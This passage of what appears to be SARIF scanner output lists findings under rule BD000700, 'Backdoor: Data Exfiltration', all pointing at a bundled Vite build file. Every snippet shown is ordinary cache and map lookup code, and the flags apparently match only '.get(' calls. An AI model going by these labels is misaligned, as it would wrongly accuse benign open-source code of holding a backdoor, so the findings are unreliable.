                    "text": "\t\t\tvalidateFilePath(filepath);\n\t\t\tconst absPath = path$a.resolve(process.cwd(), filepath);\n\t\t\tif (cache && loadCache.has(absPath)) {\n\t\t\t\treturn loadCache.get(absPath);\n\t\t\t}\n\t\t\tconst {base, ext} = path$a.parse(absPath);\n\t\t\tconst loaderKey = ext || 'noExt';\n",
                    "rendered": {
                      "text": "\t\t\tvalidateFilePath(filepath);\n\t\t\tconst absPath = path$a.resolve(process.cwd(), filepath);\n\t\t\tif (cache && loadCache.has(absPath)) {\n\t\t\t\treturn loadCache.get(absPath);\n\t\t\t}\n\t\t\tconst {base, ext} = path$a.parse(absPath);\n\t\t\tconst loaderKey = ext || 'noExt';\n",
                      "markdown": "`\t\t\tvalidateFilePath(filepath);\n\t\t\tconst absPath = path$a.resolve(process.cwd(), filepath);\n\t\t\tif (cache && loadCache.has(absPath)) {\n\t\t\t\treturn loadCache.get(absPath);\n\t\t\t}\n\t\t\tconst {base, ext} = path$a.parse(absPath);\n\t\t\tconst loaderKey = ext || 'noExt';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 25991,
                  "startColumn": 26,
                  "endLine": 25991,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\t\t\tlet dir = searchFrom;\n\t\t\tdirLoop: while (true) {\n\t\t\t\tif (cache) {\n\t\t\t\t\tconst r = searchCache.get(dir);\n\t\t\t\t\tif (r !== undefined) {\n\t\t\t\t\t\tfor (const p of visited) searchCache.set(p, r);\n\t\t\t\t\t\treturn r;\n",
                    "rendered": {
                      "text": "\t\t\tlet dir = searchFrom;\n\t\t\tdirLoop: while (true) {\n\t\t\t\tif (cache) {\n\t\t\t\t\tconst r = searchCache.get(dir);\n\t\t\t\t\tif (r !== undefined) {\n\t\t\t\t\t\tfor (const p of visited) searchCache.set(p, r);\n\t\t\t\t\t\treturn r;\n",
                      "markdown": "`\t\t\tlet dir = searchFrom;\n\t\t\tdirLoop: while (true) {\n\t\t\t\tif (cache) {\n\t\t\t\t\tconst r = searchCache.get(dir);\n\t\t\t\t\tif (r !== undefined) {\n\t\t\t\t\t\tfor (const p of visited) searchCache.set(p, r);\n\t\t\t\t\t\treturn r;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 25902,
                  "startColumn": 20,
                  "endLine": 25902,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\t\t\tvalidateFilePath(filepath);\n\t\t\tconst absPath = path$a.resolve(process.cwd(), filepath);\n\t\t\tif (cache && loadCache.has(absPath)) {\n\t\t\t\treturn loadCache.get(absPath);\n\t\t\t}\n\t\t\tconst {base, ext} = path$a.parse(absPath);\n\t\t\tconst loaderKey = ext || 'noExt';\n",
                    "rendered": {
                      "text": "\t\t\tvalidateFilePath(filepath);\n\t\t\tconst absPath = path$a.resolve(process.cwd(), filepath);\n\t\t\tif (cache && loadCache.has(absPath)) {\n\t\t\t\treturn loadCache.get(absPath);\n\t\t\t}\n\t\t\tconst {base, ext} = path$a.parse(absPath);\n\t\t\tconst loaderKey = ext || 'noExt';\n",
                      "markdown": "`\t\t\tvalidateFilePath(filepath);\n\t\t\tconst absPath = path$a.resolve(process.cwd(), filepath);\n\t\t\tif (cache && loadCache.has(absPath)) {\n\t\t\t\treturn loadCache.get(absPath);\n\t\t\t}\n\t\t\tconst {base, ext} = path$a.parse(absPath);\n\t\t\tconst loaderKey = ext || 'noExt';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 25836,
                  "startColumn": 26,
                  "endLine": 25836,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\t\t\tlet dir = searchFrom;\n\t\t\tdirLoop: while (true) {\n\t\t\t\tif (cache) {\n\t\t\t\t\tconst r = searchCache.get(dir);\n\t\t\t\t\tif (r !== undefined) {\n\t\t\t\t\t\tfor (const p of visited) searchCache.set(p, r);\n\t\t\t\t\t\treturn r;\n",
                    "rendered": {
                      "text": "\t\t\tlet dir = searchFrom;\n\t\t\tdirLoop: while (true) {\n\t\t\t\tif (cache) {\n\t\t\t\t\tconst r = searchCache.get(dir);\n\t\t\t\t\tif (r !== undefined) {\n\t\t\t\t\t\tfor (const p of visited) searchCache.set(p, r);\n\t\t\t\t\t\treturn r;\n",
                      "markdown": "`\t\t\tlet dir = searchFrom;\n\t\t\tdirLoop: while (true) {\n\t\t\t\tif (cache) {\n\t\t\t\t\tconst r = searchCache.get(dir);\n\t\t\t\t\tif (r !== undefined) {\n\t\t\t\t\t\tfor (const p of visited) searchCache.set(p, r);\n\t\t\t\t\t\treturn r;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24398,
                  "startColumn": 23,
                  "endLine": 24398,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  }\n\n  function unshift (value, done) {\n    var current = cache.get();\n\n    current.context = context;\n    current.release = release;\n",
                    "rendered": {
                      "text": "  }\n\n  function unshift (value, done) {\n    var current = cache.get();\n\n    current.context = context;\n    current.release = release;\n",
                      "markdown": "`  }\n\n  function unshift (value, done) {\n    var current = cache.get();\n\n    current.context = context;\n    current.release = release;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24374,
                  "startColumn": 23,
                  "endLine": 24374,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  }\n\n  function push (value, done) {\n    var current = cache.get();\n\n    current.context = context;\n    current.release = release;\n",
                    "rendered": {
                      "text": "  }\n\n  function push (value, done) {\n    var current = cache.get();\n\n    current.context = context;\n    current.release = release;\n",
                      "markdown": "`  }\n\n  function push (value, done) {\n    var current = cache.get();\n\n    current.context = context;\n    current.release = release;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20631,
                  "startColumn": 23,
                  "endLine": 20631,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    },\n    load(id) {\n      if (id.startsWith(dataUriPrefix)) {\n        return resolved.get(id.slice(dataUriPrefix.length));\n      }\n    }\n  };\n",
                    "rendered": {
                      "text": "    },\n    load(id) {\n      if (id.startsWith(dataUriPrefix)) {\n        return resolved.get(id.slice(dataUriPrefix.length));\n      }\n    }\n  };\n",
                      "markdown": "`    },\n    load(id) {\n      if (id.startsWith(dataUriPrefix)) {\n        return resolved.get(id.slice(dataUriPrefix.length));\n      }\n    }\n  };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20563,
                  "startColumn": 39,
                  "endLine": 20563,
                  "endColumn": 44,
                  "snippet": {
                    "text": "      for (const [referenceId, { originalFileName }] of assets.entries()) {\n        if (!manifest[originalFileName]) {\n          const fileName = this.getFileName(referenceId);\n          const asset = fileNameToAsset.get(fileName);\n          if (asset) {\n            manifest[originalFileName] = asset;\n          }\n",
                    "rendered": {
                      "text": "      for (const [referenceId, { originalFileName }] of assets.entries()) {\n        if (!manifest[originalFileName]) {\n          const fileName = this.getFileName(referenceId);\n          const asset = fileNameToAsset.get(fileName);\n          if (asset) {\n            manifest[originalFileName] = asset;\n          }\n",
                      "markdown": "`      for (const [referenceId, { originalFileName }] of assets.entries()) {\n        if (!manifest[originalFileName]) {\n          const fileName = this.getFileName(referenceId);\n          const asset = fileNameToAsset.get(fileName);\n          if (asset) {\n            manifest[originalFileName] = asset;\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20533,
                  "startColumn": 36,
                  "endLine": 20533,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        if (isEntry) manifestChunk.isEntry = true;\n        return manifestChunk;\n      }\n      const assets = generatedAssets.get(config);\n      const entryCssAssetFileNames = /* @__PURE__ */ new Set();\n      for (const [id, asset] of assets.entries()) {\n        if (asset.isEntry) {\n",
                    "rendered": {
                      "text": "        if (isEntry) manifestChunk.isEntry = true;\n        return manifestChunk;\n      }\n      const assets = generatedAssets.get(config);\n      const entryCssAssetFileNames = /* @__PURE__ */ new Set();\n      for (const [id, asset] of assets.entries()) {\n        if (asset.isEntry) {\n",
                      "markdown": "`        if (isEntry) manifestChunk.isEntry = true;\n        return manifestChunk;\n      }\n      const assets = generatedAssets.get(config);\n      const entryCssAssetFileNames = /* @__PURE__ */ new Set();\n      for (const [id, asset] of assets.entries()) {\n        if (asset.isEntry) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20422,
                  "startColumn": 19,
                  "endLine": 20422,
                  "endColumn": 24,
                  "snippet": {
                    "text": "      originalFileName,\n      source: content\n    });\n    generatedAssets.get(config).set(referenceId, { originalFileName });\n    url = `__VITE_ASSET__${referenceId}__${postfix ? `$_${postfix}__` : ``}`;\n  }\n  cache.set(id, url);\n",
                    "rendered": {
                      "text": "      originalFileName,\n      source: content\n    });\n    generatedAssets.get(config).set(referenceId, { originalFileName });\n    url = `__VITE_ASSET__${referenceId}__${postfix ? `$_${postfix}__` : ``}`;\n  }\n  cache.set(id, url);\n",
                      "markdown": "`      originalFileName,\n      source: content\n    });\n    generatedAssets.get(config).set(referenceId, { originalFileName });\n    url = `__VITE_ASSET__${referenceId}__${postfix ? `$_${postfix}__` : ``}`;\n  }\n  cache.set(id, url);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20392,
                  "startColumn": 22,
                  "endLine": 20392,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    return publicFileToBuiltUrl(id, config);\n  }\n  const cache = assetCache.get(config);\n  const cached = cache.get(id);\n  if (cached) {\n    return cached;\n  }\n",
                    "rendered": {
                      "text": "    return publicFileToBuiltUrl(id, config);\n  }\n  const cache = assetCache.get(config);\n  const cached = cache.get(id);\n  if (cached) {\n    return cached;\n  }\n",
                      "markdown": "`    return publicFileToBuiltUrl(id, config);\n  }\n  const cache = assetCache.get(config);\n  const cached = cache.get(id);\n  if (cached) {\n    return cached;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20391,
                  "startColumn": 26,
                  "endLine": 20391,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  if (!skipPublicCheck && checkPublicFile(id, config)) {\n    return publicFileToBuiltUrl(id, config);\n  }\n  const cache = assetCache.get(config);\n  const cached = cache.get(id);\n  if (cached) {\n    return cached;\n",
                    "rendered": {
                      "text": "  if (!skipPublicCheck && checkPublicFile(id, config)) {\n    return publicFileToBuiltUrl(id, config);\n  }\n  const cache = assetCache.get(config);\n  const cached = cache.get(id);\n  if (cached) {\n    return cached;\n",
                      "markdown": "`  if (!skipPublicCheck && checkPublicFile(id, config)) {\n    return publicFileToBuiltUrl(id, config);\n  }\n  const cache = assetCache.get(config);\n  const cached = cache.get(id);\n  if (cached) {\n    return cached;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20377,
                  "startColumn": 12,
                  "endLine": 20377,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    cache = /* @__PURE__ */ new Map();\n    publicAssetUrlCache.set(config, cache);\n  }\n  if (!cache.get(hash)) {\n    cache.set(hash, url);\n  }\n  return `__VITE_PUBLIC_ASSET__${hash}__`;\n",
                    "rendered": {
                      "text": "    cache = /* @__PURE__ */ new Map();\n    publicAssetUrlCache.set(config, cache);\n  }\n  if (!cache.get(hash)) {\n    cache.set(hash, url);\n  }\n  return `__VITE_PUBLIC_ASSET__${hash}__`;\n",
                      "markdown": "`    cache = /* @__PURE__ */ new Map();\n    publicAssetUrlCache.set(config, cache);\n  }\n  if (!cache.get(hash)) {\n    cache.set(hash, url);\n  }\n  return `__VITE_PUBLIC_ASSET__${hash}__`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20372,
                  "startColumn": 33,
                  "endLine": 20372,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    return joinUrlSegments(config.decodedBase, url);\n  }\n  const hash = getHash(url);\n  let cache = publicAssetUrlCache.get(config);\n  if (!cache) {\n    cache = /* @__PURE__ */ new Map();\n    publicAssetUrlCache.set(config, cache);\n",
                    "rendered": {
                      "text": "    return joinUrlSegments(config.decodedBase, url);\n  }\n  const hash = getHash(url);\n  let cache = publicAssetUrlCache.get(config);\n  if (!cache) {\n    cache = /* @__PURE__ */ new Map();\n    publicAssetUrlCache.set(config, cache);\n",
                      "markdown": "`    return joinUrlSegments(config.decodedBase, url);\n  }\n  const hash = getHash(url);\n  let cache = publicAssetUrlCache.get(config);\n  if (!cache) {\n    cache = /* @__PURE__ */ new Map();\n    publicAssetUrlCache.set(config, cache);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20363,
                  "startColumn": 41,
                  "endLine": 20363,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  return joinUrlSegments(base, removeLeadingSlash(rtn));\n}\nfunction getPublicAssetFilename(hash, config) {\n  return publicAssetUrlCache.get(config)?.get(hash);\n}\nconst publicAssetUrlCache = /* @__PURE__ */ new WeakMap();\nconst publicAssetUrlRE = /__VITE_PUBLIC_ASSET__([a-z\\d]{8})__/g;\n",
                    "rendered": {
                      "text": "  return joinUrlSegments(base, removeLeadingSlash(rtn));\n}\nfunction getPublicAssetFilename(hash, config) {\n  return publicAssetUrlCache.get(config)?.get(hash);\n}\nconst publicAssetUrlCache = /* @__PURE__ */ new WeakMap();\nconst publicAssetUrlRE = /__VITE_PUBLIC_ASSET__([a-z\\d]{8})__/g;\n",
                      "markdown": "`  return joinUrlSegments(base, removeLeadingSlash(rtn));\n}\nfunction getPublicAssetFilename(hash, config) {\n  return publicAssetUrlCache.get(config)?.get(hash);\n}\nconst publicAssetUrlCache = /* @__PURE__ */ new WeakMap();\nconst publicAssetUrlRE = /__VITE_PUBLIC_ASSET__([a-z\\d]{8})__/g;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20363,
                  "startColumn": 28,
                  "endLine": 20363,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  return joinUrlSegments(base, removeLeadingSlash(rtn));\n}\nfunction getPublicAssetFilename(hash, config) {\n  return publicAssetUrlCache.get(config)?.get(hash);\n}\nconst publicAssetUrlCache = /* @__PURE__ */ new WeakMap();\nconst publicAssetUrlRE = /__VITE_PUBLIC_ASSET__([a-z\\d]{8})__/g;\n",
                    "rendered": {
                      "text": "  return joinUrlSegments(base, removeLeadingSlash(rtn));\n}\nfunction getPublicAssetFilename(hash, config) {\n  return publicAssetUrlCache.get(config)?.get(hash);\n}\nconst publicAssetUrlCache = /* @__PURE__ */ new WeakMap();\nconst publicAssetUrlRE = /__VITE_PUBLIC_ASSET__([a-z\\d]{8})__/g;\n",
                      "markdown": "`  return joinUrlSegments(base, removeLeadingSlash(rtn));\n}\nfunction getPublicAssetFilename(hash, config) {\n  return publicAssetUrlCache.get(config)?.get(hash);\n}\nconst publicAssetUrlCache = /* @__PURE__ */ new WeakMap();\nconst publicAssetUrlRE = /__VITE_PUBLIC_ASSET__([a-z\\d]{8})__/g;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20248,
                  "startColumn": 39,
                  "endLine": 20248,
                  "endColumn": 44,
                  "snippet": {
                    "text": "  while (match = publicAssetUrlRE.exec(code)) {\n    s ||= new MagicString(code);\n    const [full, hash] = match;\n    const publicUrl = publicAssetUrlMap.get(hash).slice(1);\n    const replacement = toOutputFilePathInJS(\n      publicUrl,\n      \"public\",\n",
                    "rendered": {
                      "text": "  while (match = publicAssetUrlRE.exec(code)) {\n    s ||= new MagicString(code);\n    const [full, hash] = match;\n    const publicUrl = publicAssetUrlMap.get(hash).slice(1);\n    const replacement = toOutputFilePathInJS(\n      publicUrl,\n      \"public\",\n",
                      "markdown": "`  while (match = publicAssetUrlRE.exec(code)) {\n    s ||= new MagicString(code);\n    const [full, hash] = match;\n    const publicUrl = publicAssetUrlMap.get(hash).slice(1);\n    const replacement = toOutputFilePathInJS(\n      publicUrl,\n      \"public\",\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20243,
                  "startColumn": 47,
                  "endLine": 20243,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    const replacementString = typeof replacement === \"string\" ? JSON.stringify(encodeURIPath(replacement)).slice(1, -1) : `\"+${replacement.runtime}+\"`;\n    s.update(match.index, match.index + full.length, replacementString);\n  }\n  const publicAssetUrlMap = publicAssetUrlCache.get(config);\n  publicAssetUrlRE.lastIndex = 0;\n  while (match = publicAssetUrlRE.exec(code)) {\n    s ||= new MagicString(code);\n",
                    "rendered": {
                      "text": "    const replacementString = typeof replacement === \"string\" ? JSON.stringify(encodeURIPath(replacement)).slice(1, -1) : `\"+${replacement.runtime}+\"`;\n    s.update(match.index, match.index + full.length, replacementString);\n  }\n  const publicAssetUrlMap = publicAssetUrlCache.get(config);\n  publicAssetUrlRE.lastIndex = 0;\n  while (match = publicAssetUrlRE.exec(code)) {\n    s ||= new MagicString(code);\n",
                      "markdown": "`    const replacementString = typeof replacement === \"string\" ? JSON.stringify(encodeURIPath(replacement)).slice(1, -1) : `\"+${replacement.runtime}+\"`;\n    s.update(match.index, match.index + full.length, replacementString);\n  }\n  const publicAssetUrlMap = publicAssetUrlCache.get(config);\n  publicAssetUrlRE.lastIndex = 0;\n  while (match = publicAssetUrlRE.exec(code)) {\n    s ||= new MagicString(code);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20190,
                  "startColumn": 23,
                  "endLine": 20190,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  return publicFiles;\n}\nfunction getPublicFiles(config) {\n  return publicFilesMap.get(config);\n}\nfunction checkPublicFile(url, config) {\n  const { publicDir } = config;\n",
                    "rendered": {
                      "text": "  return publicFiles;\n}\nfunction getPublicFiles(config) {\n  return publicFilesMap.get(config);\n}\nfunction checkPublicFile(url, config) {\n  const { publicDir } = config;\n",
                      "markdown": "`  return publicFiles;\n}\nfunction getPublicFiles(config) {\n  return publicFilesMap.get(config);\n}\nfunction checkPublicFile(url, config) {\n  const { publicDir } = config;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 19571,
                  "startColumn": 45,
                  "endLine": 19571,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    };\n    const receive = (id2, args) => {\n      if (resolvers.has(id2)) {\n        const { resolve, reject } = resolvers.get(id2);\n        resolvers.delete(id2);\n        if (\"result\" in args) {\n          resolve(args.result);\n",
                    "rendered": {
                      "text": "    };\n    const receive = (id2, args) => {\n      if (resolvers.has(id2)) {\n        const { resolve, reject } = resolvers.get(id2);\n        resolvers.delete(id2);\n        if (\"result\" in args) {\n          resolve(args.result);\n",
                      "markdown": "`    };\n    const receive = (id2, args) => {\n      if (resolvers.has(id2)) {\n        const { resolve, reject } = resolvers.get(id2);\n        resolvers.delete(id2);\n        if (\"result\" in args) {\n          resolve(args.result);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 19103,
                  "startColumn": 25,
                  "endLine": 19103,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\t\t\t\t}\n\t\t\t})\n\t\t\t.catch((e) => {\n\t\t\t\tif (this.#configPaths.get(key) === configPath) {\n\t\t\t\t\tthis.#configPaths.set(key, e);\n\t\t\t\t}\n\t\t\t});\n",
                    "rendered": {
                      "text": "\t\t\t\t}\n\t\t\t})\n\t\t\t.catch((e) => {\n\t\t\t\tif (this.#configPaths.get(key) === configPath) {\n\t\t\t\t\tthis.#configPaths.set(key, e);\n\t\t\t\t}\n\t\t\t});\n",
                      "markdown": "`\t\t\t\t}\n\t\t\t})\n\t\t\t.catch((e) => {\n\t\t\t\tif (this.#configPaths.get(key) === configPath) {\n\t\t\t\t\tthis.#configPaths.set(key, e);\n\t\t\t\t}\n\t\t\t});\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 19098,
                  "startColumn": 25,
                  "endLine": 19098,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\t\tthis.#configPaths.set(key, configPath);\n\t\tconfigPath\n\t\t\t.then((path) => {\n\t\t\t\tif (this.#configPaths.get(key) === configPath) {\n\t\t\t\t\tthis.#configPaths.set(key, path);\n\t\t\t\t}\n\t\t\t})\n",
                    "rendered": {
                      "text": "\t\tthis.#configPaths.set(key, configPath);\n\t\tconfigPath\n\t\t\t.then((path) => {\n\t\t\t\tif (this.#configPaths.get(key) === configPath) {\n\t\t\t\t\tthis.#configPaths.set(key, path);\n\t\t\t\t}\n\t\t\t})\n",
                      "markdown": "`\t\tthis.#configPaths.set(key, configPath);\n\t\tconfigPath\n\t\t\t.then((path) => {\n\t\t\t\tif (this.#configPaths.get(key) === configPath) {\n\t\t\t\t\tthis.#configPaths.set(key, path);\n\t\t\t\t}\n\t\t\t})\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
